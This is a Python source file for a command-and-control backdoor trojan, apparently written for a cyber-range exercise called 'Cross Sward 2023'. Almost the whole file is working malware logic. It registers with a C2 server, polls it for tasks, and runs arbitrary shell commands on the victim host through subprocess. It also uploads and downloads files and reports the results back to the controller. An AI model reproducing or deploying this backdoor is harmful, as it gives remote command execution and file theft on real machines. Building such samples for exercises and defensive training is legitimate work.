#-----------------------------------------------------------------------------
# Name:        backdoorTrojan.py
#
# Purpose:     This module is a C2 backdoor Trojan (hook with the C2-client) example 
#              with a Modbus I/O lib plug in to run the victim to carry out the
#              cyber attack action includes : run command, tranferfile, launch 
#              false data injection.
#
# Author:      Yuancheng Liu
#
# Version:     v_0.1.1
# Created:     2023/10/19
# Copyright:   Copyright (c) 2023 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------
""" Program design: 
    We want to implement a remote backdoor trojan which can carry other Malicious
    Action function to build a remote controlable malware which can linked in our 
    C2 emulation system (https://github.com/LiuYuancheng/Python_Malwares_Repo/tree/main/src/c2Emulator)
    This program will be used in the testRun attack demo and verfication of the 
    cyber event : Cross Sward 2023
"""

import os
import time
import subprocess
from datetime import datetime
import c2MwUtils
import c2Client

dirpath = os.path.dirname(__file__)

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class malwareTest(object):

    def __init__(self) -> None:
        self.malwareID = 'backdoorTrojan2'
        c2Ipaddr = '127.0.0.1'
        malownIP = '192.168.50.11'
        self.c2Connector = c2Client.c2Client(self.malwareID, c2Ipaddr, ownIP=malownIP)
        self.taskList = [
            {
                'taskID': 0,
                'taskType': 'register',
                'StartT': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'repeat': 1,
                'ExPerT': 0,
                'state' : c2MwUtils.TASK_R_FLG,
                'taskData': None
            },
            {
                'taskID': 1,
                'taskType': 'upload',
                'StartT': None,
                'repeat': 1,
                'ExPerT': 0,
                'state' : c2MwUtils.TASK_A_FLG,
                'taskData': [os.path.join(dirpath, "update_installer.zip")]
            },

            {
                'taskID': 2,
                'taskType': 'download',
                'StartT': None,
                'repeat': 1,
                'ExPerT': 0,
                'state' : c2MwUtils.TASK_A_FLG,
                'taskData': ['2023-12-13_100327.png','NCL_SGX Service.docx']
            },
        ]
        self.ownRcd = c2MwUtils.mwClientRcd(self.malwareID, malownIP, taskList=self.taskList)
        self.c2Connector.registerToC2(taskList=self.taskList)
        self.c2Connector.start()
        self.terminate = False 

    #-----------------------------------------------------------------------------
    def run(self):
        while not self.terminate:
            # Check whether got new incomming task
            task = self.c2Connector.getOneC2Task()
            # sychronized the task record
            if task is not None:
                self.ownRcd.addNewTask(task)
            # do one task
            for taskDict in self.ownRcd.getTaskList(taskState=c2MwUtils.TASK_A_FLG):
                idx = taskDict['taskID']
                resultStr = 'taskfinished'
                for _ in range(taskDict['repeat']):
                    if taskDict['taskType'] == 'upload' or taskDict['taskType'] == 'download':
                        time.sleep(int(taskDict['ExPerT']))
                        uploadFlg = taskDict['taskType'] == 'upload'
                        self.c2Connector.transferFiles(taskDict['taskData'], uploadFlg=uploadFlg)
                        resultStr = 'File transfered'
                    elif taskDict['taskType'] == c2MwUtils.CMD_FLG:
                        cmd = str(taskDict['taskData'][0])
                        print("Run cmd : %s " %str(cmd))
                        resultStr= self.runCmd('detail', cmd)
                    self.ownRcd.setTaskState(idx, state=c2MwUtils.TASK_F_FLG)
                    reportDict ={
                        'taskID': idx,
                        'state': c2Client.TASK_F_FLG,
                        'Time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'taskData': str(resultStr)
                    }
                    self.c2Connector.addNewReport(reportDict)
                    self.ownRcd.setTaskState(idx, state=c2MwUtils.TASK_F_FLG)
                    time.sleep(0.1)
                
    #-----------------------------------------------------------------------------
    def runCmd(self, returnType, cmdStr):
        """ Run a command and collect the result on the victim host.
        Args:
            returnType (str): if == 'detail' return the command execution result, 
                        else return execution success/fail
            cmdStr (str):  command string.
        """
        if returnType and cmdStr:
            try:
                result = subprocess.check_output(str(cmdStr), 
                                                stderr=subprocess.STDOUT, 
                                                shell=True)
                print(result)
                return result if returnType == 'detail' else 'success'
            except Exception as err:
                print("Rum cmd error: %s" %str(err))
                return str(err) if returnType == 'detail' else 'fail'
        else:
            return 'error'
        
    def stop(self):
        self.c2Connector.stop()

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    client = malwareTest()
    time.sleep(1)
    client.run()
    for i in range(10):
        time.sleep(1)
        print(i)
    client.stop()

if __name__ == '__main__':
    main()
